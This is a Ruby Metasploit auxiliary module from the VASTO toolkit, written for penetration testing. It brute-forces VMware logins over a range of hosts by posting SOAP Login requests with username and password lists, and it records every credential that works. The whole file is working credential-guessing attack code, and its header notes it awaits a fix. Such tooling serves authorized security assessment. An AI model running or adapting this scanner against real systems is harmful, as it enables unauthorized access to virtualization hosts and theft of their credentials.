#################################################################
# 								#
#		This module is part of VASTO			#
#			Version 0.4				#
#		Virtualization ASsessment TOolkit		#
#								#
#################################################################

###This module is awaiting fix after metasploit has been updated

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute

	def initialize
		super(
			'Name'        => 'VMware Login Check Scanner',
			'Version'     => '0.9',
			'Description' => %q{
				This module will test a VMware login on a range of machines and
				report successful logins.  If you have loaded a database plugin
				and connected to a database this module will record successful
				logins and hosts so you can track your access.
			},
			'Author'      => ['Paolo Canaletti'],
			'License'     => GPL_LICENSE
		)
		deregister_options('RHOST')
		# does not work well with the current Msf::Auxiliary::AuthBrute... but nothing prevents you from trying in the future, just delete this
		deregister_options('PASS_FILE')
		# does not work well with the current Msf::Auxiliary::AuthBrute... but nothing prevents you from trying in the future, just  delete this
		deregister_options('USER_FILE')
		deregister_options('VHOST')
		
		register_options(
			[	
				Opt::RPORT(443),
				OptBool.new(	'VERBOSE',		[ true, "Verbose output", false ]),
				OptString.new(	'passTest',	[ false, "VMware Password (only one)", ]),
				OptBool.new(	'SSL',			[ true, "Use SSL (default true)", true ]),
				OptString.new(	'userTest',	[ false, "VMware Username (only one)", ]),
			], self.class)

		register_advanced_options([
			OptString.new('Locale', [true, 
'Change the "locale" variable if necessary 
---------------------------------------------
Locale 	Country			Language (UTF-8):
---------------------------------------------		
en_US 	United States 	English
de_DE 	Germany			German
ja_JP 	Japan			Japanese
ko_KR 	Korea			Korean
zh_CN 	China			Simplified Chinese
zh_TW 	China			Traditional Chinese
fr_FR 	France			French
it_IT 	Italy			Italian
es_ES 	Spain			Spanish
pt_BR 	Brazil			Portuguese
cs_CZ 	Czech Republic 	Czech
hu_HU 	Hungary			Hungarian
pl_PL 	Poland			Polish
ru_RU	Russia			Russian
---------------------------------------------',
				"it_IT"
			]),		
		], self.class)
	end

	def run_host(ip)
		STDOUT.sync = true
		print_status("Starting host #{ip}")
		if (datastore["userTest"] and not datastore["userTest"].empty? or
			datastore["passTest"] and not datastore["passTest"].empty?)
			# then just do this user/pass
			try_user_pass(datastore["userTest"], datastore["passTest"], [datastore["userTest"],ip,rport].join(":"))
		else
			begin
				each_user_pass do |user, pass|
					this_cred = [user,ip,rport].join(":")
					next if self.credentials_good[this_cred]
					try_user_pass(user, pass, this_cred)
				end
			rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => rex_exep
			    print_error "#{ rex_exep }"
			rescue ::Timeout::Error, ::Errno::EPIPE => other
			    print_error "#{ other }"
			rescue Exception
			  nil
			end
		end
	end


	def try_user_pass(user, pass, this_cred)
		sm        = 'ha-sessionmgr'			
		locale    = datastore["Locale"]

		dataVMware = """<?xml version=\"1.0\" encoding=\"utf-8\"?> \
				    <soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\" \
				    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" \
				    xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"><soap:Body> \
				    <Login xmlns=\"urn:internalvim25\"> \
				    <_this type=\"SessionManager\">"+sm+"</_this> \
				    <userName>"+user+"</userName> \
				    <password>"+pass+"</password> \
				    <locale>"+locale+"</locale></Login> \
				    </soap:Body></soap:Envelope>"""  		
		begin
		# VMware
			res = send_request_raw( {
				'uri'     => '/sdk',
				'method'  => 'POST',
				'vhost'   => rhost,
				'data'    => dataVMware,
				'headers' => {
					'User-Agent'      => 'VMware VI Client',
					'Content-Length'  => dataVMware.length,
					'SOAPAction'      => '\"\"',
					'Expect'          => '100-continue',
					'Content-Type'    => 'text/xml; charset=\"UTF-8\"',
				}
			}, -1)
	
			case res.code
			when 503
				print_error("#{rhost} - FAILED LOGIN error 503 \tuser: \'#{user}\' pass: \'#{pass}\'") if (datastore["VERBOSE"])
				report_note(
					:host	=> rhost,
					:proto	=> 'HTTPS',
					:port   =>  datastore['RPORT'],
					:type   => 'host.VMware.metasploit_login_bruteforcer',
					:data   => {:user => user, :status => "HTTP/1.1 503 Service Unavailable."},
					:update => :unique_data
				)


			when 500
				print_error("#{rhost} - Login Failed error 500 \tuser: \'#{user}\' pass: \'#{pass}\'") if (datastore["VERBOSE"])
				report_note(
					:host	=> rhost,
					:proto	=> 'HTTPS',
					:port   =>  datastore['RPORT'],
					:type   => 'host.VMware.metasploit_login_bruteforcer',
					:data   => {:user => user, :status => "HTTP/1.1 500 - Cannot complete login due to an incorrect user name or password."},
					:update => :unique_data
				)
				self.credentials_tried[this_cred] = pass	

			when 404
				print_error("#{rhost} - Login Failed error 404 user: \'#{user}\' pass: \'#{pass}\'") if (datastore["VERBOSE"])
				report_note(
					:host	=> rhost,
					:proto	=> 'HTTPS',
					:port   =>  datastore['RPORT'],
					:type   => 'host.VMware.metasploit_login_bruteforcer',
					:data   => {:user => user, :status => "HTTP/1.1 404 - Not Found. (Bad Request)"},
					:update => :unique_data
				)
			
			when 403
				print_error("#{rhost} - Login Failed error 403 \tuser: \'#{user}\' pass: \'#{pass}\'") if (datastore["VERBOSE"])
				report_note(
					:host	=> rhost,
					:proto	=> 'HTTPS',
					:port   =>  datastore['RPORT'],
					:type   => 'host.VMware.metasploit_login_bruteforcer',
					:data   => {:user => user, :status => "HTTP/1.1 403 - Forbidden. (Bad Request)"},
					:update => :unique_data
				)
																																													
			when 400
				print_error("#{rhost} - Login Failed error 400 \tUSER: \'#{user}\' PASS: \'#{pass}\'") if (datastore["VERBOSE"])
				report_note(
					:host	=> rhost,
					:proto	=> 'HTTPS',
					:port   =>  datastore['RPORT'],
					:type   => 'host.VMware.metasploit_login_bruteforcer',
					:data   => {:user => user, :status => "HTTP/1.1 400 - Bad Request."},
					:update => :unique_data
				)
				
			when 200
				print_good  ("#{rhost} - SUCCESSFUL LOGIN \tuser: '#{user}' pass: '#{pass}' <===#")
				puts res if (datastore["VERBOSE"]) # to see the session ID and vmware_soap_session ... will be more easily readable in the future release, for now ... sorry!
				report_auth_info(
					:host	=> rhost,
					:proto	=> 'HTTPS',
					:type	=> 'host.VMware.metasploit_login_bruteforcer',
					:user	=> user,
					:pass	=> pass,
					:targ_host	=> rhost,
					:targ_port	=> datastore['RPORT']
				)
				self.credentials_good[this_cred] = pass	
			end 		
			
		# If we get here then we've found the password for this user, move on
		# to the next one.
		return :next_user
		
	rescue Exception => e
	puts "#{e} #{e.class}"
		end
	

	end
end

